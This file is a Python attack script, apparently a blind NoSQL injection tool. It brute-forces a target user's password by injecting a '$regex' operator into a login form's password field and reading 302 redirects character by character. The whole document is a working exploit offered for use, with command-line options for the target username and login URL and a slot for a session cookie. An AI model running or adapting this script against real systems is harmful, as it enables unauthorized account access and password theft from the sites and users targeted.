#!/usr/bin/python3
import argparse
from logzero import logger
import requests
import urllib3
import string
import urllib
import sys
from termcolor import colored
urllib3.disable_warnings()

def banner():
    print(colored(""" ____  _ _           _       _   _      ____   ___  _     _ \n| __ )| (_)_ __   __| |     | \\ | | ___/ ___| / _ \\| |   (_)\n|  _ \\| | | '_ \\ / _` |_____|  \\| |/ _ \\___ \\| | | | |   | |\n| |_) | | | | | | (_| |_____| |\\  | (_) |__) | |_| | |___| |\n|____/|_|_|_| |_|\\__,_|     |_| \\_|\\___/____/ \\__\\_\\_____|_|\n                                                            \n""", 'cyan'))


# Request Headers
heads = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "[ADD Cookie HERE]",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0"
}

# Some info
def info(username, target):
    print(colored('[+] Welcome', 'yellow'))
    print(colored('[+] Brute forcing password for:' , 'yellow'),
          colored('{}'.format(username), 'red'))
    print(colored('[+] Target URL', 'yellow'),
          colored('{}'.format(target), 'cyan'))

# Brute forcing
def inject_passwd(username, target):
    info(args.username, args.target)
    password = ''
    try:
        while True:
            for c in string.printable:
                if c not in ['*','+','.','?','|', '&', '$']:
                    payload = 'login=login&username={}&password[$regex]=^{}'.format(username, password+c)
                    req = requests.post(target, data=payload, headers=heads, verify = False, allow_redirects = False)
                    if req.status_code == 302:
                        print('[*] Found one more char : '
                            + colored(c, 'red')
                            + colored('\t({})'.format(password+c), 'cyan'))
                        password += c
                        break
                    if c == string.printable[-1]:
                        print(
                                colored('Found password for {} user: '.format(sys.argv[1]), 'cyan')
                                + colored(password,'green'))
                        sys.exit()

    # Allow us to press 'Ctrl+C' without a huge error
    except:
        sys.exit()

def main(args):
    inject_passwd(args.username, args.target)

def parse_options():
    global parser

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", type=str,  help="The target username", dest="username")
    parser.add_argument("-t", "--target-url", type=str, help="The target login page", dest="target")

    args = parser.parse_args()
    return args

if __name__ == "__main__":
    """ This is executed when run from the command line """

    if not len(sys.argv) > 1:
        print("Usage: {} --help".format(sys.argv[0]))
        sys.exit()

    banner()
    args = parse_options()
    main(args)
